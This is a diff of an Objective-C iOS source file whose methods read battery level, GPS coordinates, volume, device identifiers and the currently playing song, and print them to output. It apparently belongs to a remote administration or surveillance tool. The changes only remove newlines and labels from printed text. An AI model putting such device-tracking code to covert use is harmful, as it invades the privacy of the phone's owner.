@@ -18,13 +18,13 @@
                  actionWithTitle:first_button
                  style:UIAlertActionStyleDefault
                  handler:^(UIAlertAction * action) {
-                     printf("First button tapped.\n");
+                     printf("First button tapped.");
                  }];
     UIAlertAction * secondButton = [UIAlertAction
                     actionWithTitle:second_button
                     style:UIAlertActionStyleDefault
                     handler:^(UIAlertAction * action) {
-                    printf("Second button tapped.\n");
+                    printf("Second button tapped.");
                     }];
     [alert addAction:firstButton];
     [alert addAction:secondButton];
@@ -34,7 +34,7 @@
 
 -(void)battery {
     int battery_level = ([_thisUIDevice batteryLevel] * 100);
-    printf("Battery Level: %d\n", battery_level);
+    printf("%d", battery_level);
 }
 
 -(void)locate {
@@ -42,7 +42,7 @@
     [manager startUpdatingLocation];
     CLLocation *location = [manager location];
     CLLocationCoordinate2D coordinate = [location coordinate];
-    NSString *result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nhttp://maps.google.com/maps?q=%f,%f\n", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
+    NSString *result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nhttp://maps.google.com/maps?q=%f,%f", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
     if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
         result = @"error";
     }
@@ -54,7 +54,7 @@
     [[AVAudioSession sharedInstance] setActive:YES error:nil];
     [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
     NSString *result = [NSString stringWithFormat:@"%.2f",[AVAudioSession sharedInstance].outputVolume];
-    printf("Volume Level: %s\n", [result cStringUsingEncoding:NSUTF8StringEncoding]);
+    printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
 }
 
 -(void)openurl:(NSString *)url {
@@ -95,8 +95,8 @@
 -(void)sysinfo {
     UIDevice *device = [UIDevice currentDevice];
     int batinfo = ([_thisUIDevice batteryLevel]*100);
-    NSString *info = [NSString stringWithFormat:@"%@ %d %@ %@ %@ %@\n", [device model], batinfo, [device systemName], [device systemVersion], [device name], [[device identifierForVendor] UUIDString]];
-    printf("%s\n", [info cStringUsingEncoding:NSUTF8StringEncoding]);
+    NSString *info = [NSString stringWithFormat:@"%@ %d %@ %@ %@ %@", [device model], batinfo, [device systemName], [device systemVersion], [device name], [[device identifierForVendor] UUIDString]];
+    printf("%s", [info cStringUsingEncoding:NSUTF8StringEncoding]);
 }
 
 -(void)send_command:(NSString *)command {
@@ -131,7 +131,7 @@
             NSString *title   = [song valueForProperty:MPMediaItemPropertyTitle];
             NSString *album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
             NSString *artist  = [song valueForProperty:MPMediaItemPropertyArtist];
-            NSString *result = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f\n", title, album, artist, time2];
+            NSString *result = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f", title, album, artist, time2];
             printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
         } else {
             printf("error");
